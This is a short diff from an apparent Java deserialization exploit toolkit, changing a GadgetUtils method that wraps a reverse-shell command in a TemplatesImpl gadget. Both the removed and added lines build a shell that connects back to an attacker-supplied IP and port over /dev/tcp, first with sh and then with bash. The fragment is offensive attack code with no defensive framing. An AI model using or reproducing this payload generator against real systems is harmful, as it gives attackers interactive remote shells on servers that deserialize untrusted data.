@@ -69,7 +69,7 @@ public class GadgetUtils {
     //whoami
     public static TemplatesImpl getTemplatesImplReverseShell(String ip,String port) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
 
-        String cmd = "new String[]{\"/bin/sh\",\"-c\",\"sh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"}";
+        String cmd = "new String[]{\"bash\",\"-c\",\"bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"}";
         return createTemplatesImpl(cmd);
     }
     //定制命令
